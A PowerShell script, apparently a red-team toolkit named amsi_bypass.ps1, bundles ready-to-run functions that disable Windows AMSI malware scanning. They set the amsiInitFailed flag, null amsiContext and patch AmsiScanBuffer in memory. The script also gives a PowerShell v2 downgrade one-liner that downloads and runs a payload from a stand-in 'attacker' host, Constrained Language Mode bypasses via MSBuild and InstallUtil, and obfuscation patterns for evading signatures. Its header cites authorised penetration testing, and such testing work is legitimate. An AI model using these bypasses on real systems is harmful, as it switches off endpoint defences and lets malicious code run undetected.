<#
.SYNOPSIS
    AMSI (Antimalware Scan Interface) bypass techniques.
.DESCRIPTION
    Multiple methods to bypass AMSI in PowerShell for payload execution.
    Each technique is a standalone function.
.NOTES
    MITRE ATT&CK: T1562.001 — Disable or Modify Tools
    T1059.001 — PowerShell
    Context: These are for authorized penetration testing to demonstrate
    that AMSI can be bypassed, proving defense-in-depth is needed.
#>

# ─── Method 1: amsiInitFailed Flag ──────────────────────────────────────

function Bypass-AmsiInitFailed {
    <# Set amsiInitFailed to True so AMSI thinks it failed to initialize #>
    $mem = [System.Runtime.InteropServices.Marshal]
    $ptr = [Ref].Assembly.GetType(
        ('System.Management.Automation.A' + 'msiU' + 'tils')
    ).GetField(
        ('amsi' + 'Init' + 'Failed'),
        'NonPublic,Static'
    )
    $ptr.SetValue($null, $true)
    Write-Output "[+] AMSI bypass (amsiInitFailed) applied"
}

# ─── Method 2: Reflection — Patching amsiContext ─────────────────────────

function Bypass-AmsiReflection {
    <# Null out the amsiContext pointer so AmsiScanBuffer returns clean #>
    $utils = [Ref].Assembly.GetType(
        ('System.Management.Automation.A' + 'msiU' + 'tils')
    )
    $context = $utils.GetField(
        ('amsi' + 'Context'),
        'NonPublic,Static'
    )
    $context.SetValue($null, [IntPtr]::Zero)
    Write-Output "[+] AMSI bypass (context null) applied"
}

# ─── Method 3: Memory Patch — AmsiScanBuffer ────────────────────────────

function Bypass-AmsiMemoryPatch {
    <# Patch AmsiScanBuffer in amsi.dll to return AMSI_RESULT_CLEAN (Matt Graeber) #>
    $win32 = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
'@
    Add-Type $win32
    $amsi = [Win32]::LoadLibrary("am" + "si.dll")
    $addr = [Win32]::GetProcAddress($amsi, "Amsi" + "Scan" + "Buffer")
    $oldProtect = 0
    [Win32]::VirtualProtect($addr, [uint32]6, 0x40, [ref]$oldProtect) | Out-Null
    # Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
    [Win32]::VirtualProtect($addr, [uint32]6, $oldProtect, [ref]$oldProtect) | Out-Null
    Write-Output "[+] AMSI bypass (memory patch) applied"
}

# ─── Method 4: PowerShell Downgrade ─────────────────────────────────────

function Bypass-PowerShellDowngrade {
    Write-Output @"
[*] PowerShell v2 Downgrade — AMSI does not exist in PS v2

    powershell.exe -Version 2 -Command "IEX (iwr http://attacker/payload.ps1)"

    Prerequisites: .NET Framework 2.0 must be installed
    Check: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

    OPSEC: Generates Event ID 400 (EngineVersion=2.0) — detectable
"@
}

# ─── Method 5: CLM Bypass (Constrained Language Mode) ───────────────────

function Bypass-CLM {
    Write-Output @"
[*] Constrained Language Mode Bypass Techniques:

    1. PowerShell v2 (no CLM):
       powershell.exe -Version 2

    2. MSBuild inline task:
       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

    3. InstallUtil:
       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

    4. Custom runspace (from C# executable):
       Compile a C# app that creates a PowerShell runspace in FullLanguage mode

    Check current mode:
       `$ExecutionContext.SessionState.LanguageMode
"@
}

# ─── Method 6: Base64 Obfuscation Patterns ──────────────────────────────

function Show-ObfuscationPatterns {
    Write-Output @"
[*] String Obfuscation Patterns for Evading AMSI String Signatures:

    # Variable concatenation
    `$a = 'Amsi'; `$b = 'Utils'; [Ref].Assembly.GetType("System.Management.Automation.`$a`$b")

    # String reversal
    `$s = '))slitU' + 'ismA.n' + 'oitam' + 'otuA.t' + 'nemeganam.metsyS(('; `$r = `$s[-1..-(`$s.Length)] -join ''

    # Base64 encoding
    `$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('AmsiUtils'))
    `$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$encoded))

    # XOR encoding
    `$key = 0x42; `$bytes = [Text.Encoding]::ASCII.GetBytes('AmsiUtils');
    `$xored = `$bytes | ForEach-Object { `$_ -bxor `$key }

    # Invoke-Expression variants
    IEX                              # Detected
    Invoke-Expression                # Detected
    . ([scriptblock]::Create(`$cmd))  # Less detected
    & ([scriptblock]::Create(`$cmd))  # Less detected
    `$ExecutionContext.InvokeCommand.InvokeScript(`$cmd)  # Rarely detected
"@
}

# ─── Detection ──────────────────────────────────────────────────────────

function Check-AMSIStatus {
    Write-Output "[*] AMSI Provider Status:"
    try {
        $amsi = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers' -ErrorAction Stop
        foreach ($p in $amsi) {
            $name = (Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\$($p.PSChildName)" -ErrorAction SilentlyContinue).'(default)'
            Write-Output "    Provider: $($p.PSChildName) ($name)"
        }
    } catch {
        Write-Output "    [-] Cannot read AMSI providers"
    }

    Write-Output "`n[*] Testing AMSI with EICAR string..."
    try {
        $result = Invoke-Expression '"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"' -ErrorAction Stop
        Write-Output "    [+] AMSI is BYPASSED (EICAR string not blocked)"
    } catch {
        Write-Output "    [-] AMSI is ACTIVE (EICAR string blocked)"
    }
}

Write-Output @"
[*] AMSI Bypass Functions Loaded:

    Bypass-AmsiInitFailed      # Flag-based bypass
    Bypass-AmsiReflection      # Context pointer null
    Bypass-AmsiMemoryPatch     # AmsiScanBuffer patch (most reliable)
    Bypass-PowerShellDowngrade # PS v2 downgrade (no AMSI)
    Bypass-CLM                 # Constrained Language Mode bypasses
    Show-ObfuscationPatterns   # String obfuscation techniques
    Check-AMSIStatus           # Check if AMSI is active

    Usage: . .\amsi_bypass.ps1; Bypass-AmsiMemoryPatch
"@
